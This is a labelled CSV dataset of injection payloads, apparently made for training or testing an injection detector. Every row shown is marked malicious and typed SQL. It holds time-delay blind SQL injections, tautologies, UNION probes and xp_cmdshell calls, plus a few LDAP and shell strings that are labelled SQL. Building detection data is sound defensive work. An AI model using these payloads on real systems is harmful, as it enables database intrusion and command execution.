,payload,is_malicious,injection_type
2516,",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2517,"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2518,"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2519,""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2520,""",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2521,"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2522,"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2523,"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2524,"'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2525,"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2526,"""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2527,",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2528,"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2529,"',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2530,""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2531,""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2532,"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2533,"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2534,"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2535,"'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2536,"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2537,"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2538,",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2539,",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2540,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2541,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2542,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2543,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2544,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2545,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2546,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2547,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2548,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2549,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2550,",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2551,",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2552,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2553,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2554,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2555,""",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2556,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2557,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2558,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2559,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2560,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2561,"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2562,waitfor delay '0:0:20' /*,1,SQL
2563,waitfor delay '0:0:20' --,1,SQL
2564,' waitfor delay '0:0:20' /*,1,SQL
2565,' waitfor delay '0:0:20' --,1,SQL
2566,""" waitfor delay '0:0:20' /*",1,SQL
2567,""" waitfor delay '0:0:20' --",1,SQL
2568,) waitfor delay '0:0:20' /*,1,SQL
2569,) waitfor delay '0:0:20' --,1,SQL
2570,)) waitfor delay '0:0:20' /*,1,SQL
2571,)) waitfor delay '0:0:20' --,1,SQL
2572,))) waitfor delay '0:0:20' /*,1,SQL
2573,))) waitfor delay '0:0:20' --,1,SQL
2574,)))) waitfor delay '0:0:20' /*,1,SQL
2575,)))) waitfor delay '0:0:20' --,1,SQL
2576,))))) waitfor delay '0:0:20' --,1,SQL
2577,)))))) waitfor delay '0:0:20' --,1,SQL
2578,') waitfor delay '0:0:20' /*,1,SQL
2579,') waitfor delay '0:0:20' --,1,SQL
2580,""") waitfor delay '0:0:20' /*",1,SQL
2581,""") waitfor delay '0:0:20' --",1,SQL
2582,')) waitfor delay '0:0:20' /*,1,SQL
2583,')) waitfor delay '0:0:20' --,1,SQL
2584,""")) waitfor delay '0:0:20' /*",1,SQL
2585,""")) waitfor delay '0:0:20' --",1,SQL
2586,'))) waitfor delay '0:0:20' /*,1,SQL
2587,'))) waitfor delay '0:0:20' --,1,SQL
2588,"""))) waitfor delay '0:0:20' /*",1,SQL
2589,"""))) waitfor delay '0:0:20' --",1,SQL
2590,')))) waitfor delay '0:0:20' /*,1,SQL
2591,')))) waitfor delay '0:0:20' --,1,SQL
2592,""")))) waitfor delay '0:0:20' /*",1,SQL
2593,""")))) waitfor delay '0:0:20' --",1,SQL
2594,'))))) waitfor delay '0:0:20' /*,1,SQL
2595,'))))) waitfor delay '0:0:20' --,1,SQL
2596,"""))))) waitfor delay '0:0:20' /*",1,SQL
2597,"""))))) waitfor delay '0:0:20' --",1,SQL
2598,')))))) waitfor delay '0:0:20' /*,1,SQL
2599,')))))) waitfor delay '0:0:20' --,1,SQL
2600,""")))))) waitfor delay '0:0:20' /*",1,SQL
2601,""")))))) waitfor delay '0:0:20' --",1,SQL
2602,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",1,SQL
2603,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",1,SQL
2604,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",1,SQL
2605,"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",1,SQL
2606,"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",1,SQL
2607,"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",1,SQL
2608,"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",1,SQL
2609,"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",1,SQL
2610,"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23",1,SQL
2611,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*",1,SQL
2612,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",1,SQL
2613,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",1,SQL
2614,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*",1,SQL
2615,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",1,SQL
2616,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",1,SQL
2617,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*",1,SQL
2618,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",1,SQL
2619,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23",1,SQL
2620,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",1,SQL
2621,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",1,SQL
2622,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",1,SQL
2623,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",1,SQL
2624,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",1,SQL
2625,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",1,SQL
2626,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",1,SQL
2627,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--",1,SQL
2628,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23",1,SQL
2629,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",1,SQL
2630,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",1,SQL
2631,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",1,SQL
2632,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",1,SQL
2633,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",1,SQL
2634,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",1,SQL
2635,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",1,SQL
2636,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--",1,SQL
2637,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",1,SQL
2638,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",1,SQL
2639,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",1,SQL
2640,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",1,SQL
2641,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",1,SQL
2642,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",1,SQL
2643,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",1,SQL
2644,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*",1,SQL
2645,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",1,SQL
2646,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",1,SQL
2647,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2648,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2649,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2650,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2651,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2652,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2653,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2654,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2655,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2656,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2657,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2658,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2659,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2660,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2661,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2662,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2663,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2664,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2665,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2666,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2667,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2668,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2669,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2670,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2671,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2672,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2673,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2674,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2675,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2676,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2677,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2678,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2679,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2680,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2681,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2682,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2683,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2684,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2685,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2686,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2687,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2688,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2689,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,SQL
2690,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,SQL
2691,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1,SQL
2692,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1,SQL
2693,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1,SQL
2694,",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,SQL
2695,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1,SQL
2696,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1,SQL
2697,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,SQL
2698,""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1,SQL
2699,""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1,SQL
2700,""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,SQL
2701,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1,SQL
2702,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1,SQL
2703,"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,SQL
2704,"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1,SQL
2705,"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1,SQL
2706,"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,SQL
2707,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1,SQL
2708,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1,SQL
2709,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1,SQL
2710,"and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2711,"and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2712,"and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2713,"' and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2714,"' and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2715,"' and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2716,""" and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2717,""" and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2718,""" and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2719,") and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2720,") and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2721,") and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2722,")) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2723,")) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2724,")) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2725,"))) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2726,"))) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2727,"))) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2728,")))) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2729,")))) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2730,")))) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2731,"') and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2732,"') and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2733,"') and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2734,""") and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2735,""") and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2736,""") and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2737,"')) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2738,"')) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2739,"')) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2740,""")) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2741,""")) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2742,""")) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2743,"'))) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2744,"'))) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2745,"'))) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2746,"""))) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2747,"""))) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2748,"""))) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2749,"')))) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2750,"')))) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2751,"')))) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2752,""")))) and 0=benchmark(3000000,MD5(1))%20/*",1,SQL
2753,""")))) and 0=benchmark(3000000,MD5(1))%20--",1,SQL
2754,""")))) and 0=benchmark(3000000,MD5(1))%20%23",1,SQL
2755,'%20--,1,SQL
2756,--';,1,SQL
2757,'%20;,1,SQL
2758,=%20',1,SQL
2759,=%20;,1,SQL
2760,=%20--,1,SQL
2761,x23,1,SQL
2762,x27,1,SQL
2763,x3D%20\x3B',1,SQL
2764,x3D%20\x27,1,SQL
2765,x27\x4F\x52 SELECT *,1,SQL
2766,x27\x6F\x72 SELECT *,1,SQL
2767,'or%20select *,1,SQL
2768,admin'--,1,SQL
2769,"<>""'%;)(&+",1,SQL
2770,'%20or%20''=',1,SQL
2771,'%20or%20'x'='x,1,SQL
2772,"""%20or%20""x""=""x",1,SQL
2773,')%20or%20('x'='x,1,SQL
2774,0 or 1=1,1,SQL
2775,' or 0=0 --,1,SQL
2776,""" or 0=0 --",1,SQL
2777,or 0=0 --,1,SQL
2778,' or 0=0 #,1,SQL
2779,""" or 0=0 #",1,SQL
2780,or 0=0 #,1,SQL
2781,' or 1=1--,1,SQL
2782,""" or 1=1--",1,SQL
2783,' or '1'='1'--,1,SQL
2784,"""' or 1 --'""",1,SQL
2785,or 1=1--,1,SQL
2786,or%201=1,1,SQL
2787,or%201=1 --,1,SQL
2788,' or 1=1 or ''=',1,SQL
2789,""" or 1=1 or """"=""",1,SQL
2790,' or a=a--,1,SQL
2791,""" or ""a""=""a",1,SQL
2792,') or ('a'='a,1,SQL
2793,""") or (""a""=""a",1,SQL
2794,"hi"" or ""a""=""a",1,SQL
2795,"hi"" or 1=1 --",1,SQL
2796,hi' or 1=1 --,1,SQL
2797,hi' or 'a'='a,1,SQL
2798,hi') or ('a'='a,1,SQL
2799,"hi"") or (""a""=""a",1,SQL
2800,'hi' or 'x'='x';,1,SQL
2801,@variable,1,SQL
2802,",@variable",1,SQL
2803,' or username like '%,1,SQL
2804,' or uname like '%,1,SQL
2805,' or userid like '%,1,SQL
2806,' or uid like '%,1,SQL
2807,' or user like '%,1,SQL
2808,exec xp,1,SQL
2809,exec sp,1,SQL
2810,'; exec master..xp_cmdshell,1,SQL
2811,'; exec xp_regread,1,SQL
2812,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,SQL
2813,--sp_password,1,SQL
2814,x27UNION SELECT,1,SQL
2815,' UNION SELECT,1,SQL
2816,' UNION ALL SELECT,1,SQL
2817,' or (EXISTS),1,SQL
2818,' (select top 1,1,SQL
2819,'||UTL_HTTP.REQUEST,1,SQL
2820,1;SELECT%20*,1,SQL
2821,to_timestamp_tz,1,SQL
2822,tz_offset,1,SQL
2823,&lt;&gt;&quot;'%;)(&amp;+,1,SQL
2824,'%20or%201=1,1,SQL
2825,%27%20or%201=1,1,SQL
2826,%20$(sleep%2050),1,SQL
2827,%20'sleep%2050',1,SQL
2828,char%4039%41%2b%40SELECT,1,SQL
2829,&apos;%20OR,1,SQL
2830,'sqlattempt1,1,SQL
2831,(sqlattempt2),1,SQL
2832,%7C,1,SQL
2833,*|,1,SQL
2834,%2A%7C,1,SQL
2835,*(|(mail=*)),1,SQL
2836,%2A%28%7C%28mail%3D%2A%29%29,1,SQL
2837,*(|(objectclass=*)),1,SQL
2838,%2A%28%7C%28objectclass%3D%2A%29%29,1,SQL
2839,%21,1,SQL
2840,' or 1=1 or ''=',1,SQL
2841,' or ''=',1,SQL
2842,x' or 1=1 or 'x'='y,1,SQL
2843,and 1=1,1,SQL
2844,and USER=USER,1,SQL
2845,and user()=user(),1,SQL
2846,and 2=0,1,SQL
2847,or 2=2,1,SQL
2848,' and '2'='2,1,SQL
2849,' and '2'='0,1,SQL
2850,' or '2'='2,1,SQL
2851,/*ora_mysql*/and/**/2=2,1,SQL
2852,/*ora_mysql*/and/**/2=0,1,SQL
2853,'/*ora_mysql*/and/**/'2'='2,1,SQL
2854,'/*ora_mysql*/and/**/'2'='0,1,SQL
2855,'/*ora_mysql*/or/**/'2'='2,1,SQL
2856,and 2=2#mysql,1,SQL
2857,and 2=0#mysql,1,SQL
